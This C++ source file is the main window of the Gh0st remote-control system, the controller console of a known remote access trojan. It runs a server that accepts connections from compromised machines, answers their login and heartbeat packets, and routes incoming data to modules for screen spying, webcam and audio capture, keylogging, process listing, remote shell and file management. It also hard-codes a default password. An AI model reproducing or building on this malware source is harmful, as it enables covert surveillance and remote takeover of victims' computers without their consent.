// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include "Gh0stView.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define SYSTIME_TIMER_ID    1

#define WM_ICON_NOTIFY WM_USER+10

CGh0stView* g_pConnectView = NULL; //在NotifyProc中初始化

CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // 在CMainFrame::CMainFrame()中初始化

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
    ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_MESSAGE(WM_ICON_NOTIFY, OnTrayNotification)
    ON_MESSAGE(WM_WORKTHREAD_MSG, OnWorkThreadMsg)                 //工作线程消息
    ON_MESSAGE(WM_UPDATE_MAINFRAME, NotifyProc2)                 //工作线程消息
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_HIDE, OnHide)
	ON_COMMAND(IDM_EXIT, OnExit)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT
};
/////////////////////////////////////////////////////////////////////////////

void My_GetTime(TCHAR Rstr[])
{
	time_t curtime=time(0);
	tm tim = *localtime(&curtime);
	int day,mon,year,hour,minute,seconds;
	day = tim.tm_mday;
	mon = tim.tm_mon;
	year = tim.tm_year;
	hour = tim.tm_hour;
	minute = tim.tm_min;
	seconds = tim.tm_sec;

	year += 1900;
	mon += 1;
	_stprintf( Rstr, _T("[当前时间:%04d年%02d月%02d日 %02d时%02d分%02d秒]"), year, mon, day, hour, minute, seconds );
}

DWORD WINAPI Change_Time(LPVOID lparam)
{
	CStatusBar *pBar = (CStatusBar*)lparam;
    CStringA oldstr;
    CString newstr;
	TCHAR strTime[128] = {0};
	char hostname[256]; 

	gethostname(hostname, sizeof(hostname));
	HOSTENT *host = gethostbyname(hostname);
	if (host != NULL)
	{ 
		for ( int i=0; ; i++ )
		{ 
			oldstr += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
			if ( host->h_addr_list[i] + host->h_length >= host->h_name )
				break;
			oldstr += "/";
		}
	}

	while (1)
	{
		My_GetTime(strTime);
		newstr.Format(_T("%s %s"), oldstr.GetBuffer(0), strTime );
		pBar->SetPaneText(0, newstr);
		Sleep(1000);
	}
	return 0;
}
/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;

    m_nSystimeTimerID = 0;
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	this->CenterWindow(CWnd::GetDesktopWindow());

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);

	if(	!m_wndTab.Create
		(
		WS_CHILD | WS_VISIBLE | CTCS_AUTOHIDEBUTTONS | CTCS_TOOLTIPS | CTCS_DRAGMOVE | CTCS_LEFT,
		CRect(0, 0, 0, 23),
		this,
		IDC_TABCTRL
		)
		)
	{
		TRACE0("Failed to create tab control\n");
		return -1;
	}

	m_wndTab.SetDragCursors(AfxGetApp()->LoadStandardCursor(IDC_CROSS),NULL);
	m_wndTab.ModifyStyle(CTCS_LEFT, 0, 0);

	LOGFONT lf = {13, 0, 0, 0, FW_NORMAL, 0, 0, 0,
		DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS,
		DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, _T("宋体")};    //设置字体为宋体
	m_wndTab.SetControlFont(lf, TRUE);

    m_nSystimeTimerID = SetTimer(SYSTIME_TIMER_ID, 1000, NULL);

	return 0;
}

void CMainFrame::OnTimer(UINT nIDEvent)
{
    if (nIDEvent == SYSTIME_TIMER_ID)
    {
        TCHAR strTime[128] = { 0 };
        My_GetTime(strTime);
        CString str = CStringW(m_strHostList);
        str += strTime;
        m_wndStatusBar.SetPaneText(0, str);
    }
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.cx = 900;
	/*
	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)//如果存在IP数据库则增加100
	{
		cs.cx += 100;
	}
	*/
	cs.cy = 500;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.lpszName = _T("Gh0st远程控制系统 - 张小方");
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
    //减少无效消息
    if (pContext == NULL || pContext->m_DeCompressionBuffer.GetBufferLen() <= 0)
        return;
    
    CMainFrame* pFrame = (CMainFrame*)lpParam;
    pFrame->PostMessage(WM_UPDATE_MAINFRAME, (WPARAM)nCode, (LPARAM)pContext);
    //CJlib库不能在工作线程操作UI
    return;
    
    
    try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// 对g_pConnectView 进行初始化
		g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView还没创建，这情况不会发生
		if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;
		str.Format(_T("S: %.2f kb/s R: %.2f kb/s"), (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
        //g_pFrame->m_wndStatusBar.SetPaneText(1, str);


		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

//added by zhangyl
LRESULT CMainFrame::NotifyProc2(WPARAM wParam, LPARAM lParam)
{
    ClientContext* pContext = (ClientContext *)lParam;
    UINT nCode = (UINT)wParam;

    try
    {
        //CMainFrame* pFrame = (CMainFrame*)lpParam;
        CString str;
        // 对g_pConnectView 进行初始化
        g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

        // g_pConnectView还没创建，这情况不会发生
        if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
            return 0;

        g_pConnectView->m_iocpServer = m_iocpServer;
        str.Format(_T("S: %.2f kb/s R: %.2f kb/s"), (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
        m_wndStatusBar.SetPaneText(1, str);


        switch (nCode)
        {
        case NC_CLIENT_CONNECT:
            break;
        case NC_CLIENT_DISCONNECT:
            g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
            break;
        case NC_TRANSMIT:
            break;
        case NC_RECEIVE:
            ProcessReceive(pContext);
            break;
        case NC_RECEIVE_COMPLETE:
            ProcessReceiveComplete(pContext);
            break;
        }
    }
    catch (...){}

    return 1;
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器
 	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        HOSTENT *host = gethostbyname(hostname);
        if (host != NULL)
        {
            for (int i = 0;; i++)
            {
                m_strHostList += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
                if (host->h_addr_list[i] + host->h_length >= host->h_name)
                    break;
                m_strHostList += "/";
            }
        }
        
        //开启一个线程用来修改显示的时间
		//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Change_Time, (LPVOID)&m_wndStatusBar, 0, NULL);
        m_wndStatusBar.SetPaneText(0, CStringW(m_strHostList));
 		str.Format(_T("端口: %d"), nPort);
 		m_wndStatusBar.SetPaneText(2, str);
 	}
 	else
 	{
 		str.Format(_T("端口%d绑定失败"), nPort);

        AfxMessageBox(str + _T("， 请检查端口是否被占用！"));

 		m_wndStatusBar.SetPaneText(1, str);
 		m_wndStatusBar.SetPaneText(2, _T("端口: 0"));
 	}

	m_wndStatusBar.SetPaneText(3, _T("连接: 0"));
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}
    BYTE b = pContext->m_DeCompressionBuffer.GetBuffer(0)[0];
	switch (b)
	{
	case TOKEN_AUTH: // 要求验证
		{
			AfxMessageBox(_T("要求验证1"));
			BYTE	*bToken = new BYTE[ m_PassWord.GetLength() + 2 ];//COMMAND_ACTIVED;
			bToken[0] = TOKEN_AUTH;
			memcpy( bToken + 1, m_PassWord, m_PassWord.GetLength() );
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
			delete[] bToken;
//			m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		}
		break;

	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
 		break;
	case TOKEN_LOGIN_FALSE: // 上线包
		{
			if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			}
		}
	case TOKEN_LOGIN_TRUE: // 上线包
		{
			if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			}
		}
		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START://键盘记录
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST://进程列表
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START://CMD
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}
void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
    KillTimer(m_nSystimeTimerID);
    m_TrayIcon.RemoveIcon();
	m_iocpServer->Shutdown();
	delete m_iocpServer;
	CFrameWnd::OnClose();
}

LRESULT CMainFrame::OnWorkThreadMsg(WPARAM wParam, LPARAM lParam)
{
    NotifyProc(this, (ClientContext *)lParam, (UINT)wParam);

    return 0;
}

LRESULT CMainFrame::OnTrayNotification(WPARAM wParam, LPARAM lParam)
{
	if (LOWORD(lParam) == WM_LBUTTONDBLCLK)
	{
		ShowWindow(SW_SHOW);
		SetForegroundWindow();
		return TRUE;
	}
	return m_TrayIcon.OnTrayNotification(wParam, lParam);
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		if (!m_TrayIcon.Enabled())
			m_TrayIcon.Create(this, WM_ICON_NOTIFY, _T("我在这里......"),
			AfxGetApp()->LoadIcon(IDR_MAINFRAME), IDR_MINIMIZE, TRUE); //构造
		ShowWindow(SW_HIDE);
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}
}
void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str;
	str.Format(_T("连接: %d"), g_pConnectView->GetListCtrl().GetItemCount());
	m_wndStatusBar.SetPaneText(3, str);
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_SHOW);
	::SetForegroundWindow(m_hWnd);
}

void CMainFrame::OnHide() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
	g_pFrame->m_TrayIcon.SetTooltipText(lpszText);
}
